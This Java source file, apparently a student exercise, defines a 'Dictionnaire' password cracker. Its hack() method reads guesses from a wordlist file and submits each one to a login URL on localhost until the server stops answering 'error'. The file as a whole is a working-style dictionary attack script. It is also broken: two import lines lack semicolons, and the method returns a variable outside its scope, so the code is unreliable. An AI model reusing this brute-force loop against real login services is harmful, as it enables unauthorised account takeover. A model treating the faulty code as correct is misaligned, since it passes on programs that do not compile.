import java.io.*
import java.util.Scanner;
import java.net.*

public class Dictionnaire extends Cracker {
    public User User1 = new User("Benjamin", "aacac");

    String s;
    int i = 0;

    public Dictionnaire() {
    }

    public String hack() throws Exception {
        InputStream doc = new FileInputStream("dictionaire.txt");

        try (Scanner obj = new Scanner(doc)) {
            while (obj.hasNextLine()) {
                i++;
                System.out.println("iteration:" + i);
                String mdp = obj.next();
                URL url = new URL("http://localhost:8080/User.php?pwd=" + mdp);
                URLConnection connection = url.openConnection();

                // `HttpURLConnection` connection = (HttpURLConnection) url.openConnection();
                // connection.setRequestMethod("GET");

                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(connection.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {

                        System.out.println(line);
                        if (line.equals("error")) {
                        } else {
                            System.exit(0);

                        }
                    }

                }

            }
            obj.close();

        }
        return mdp;

    }

}
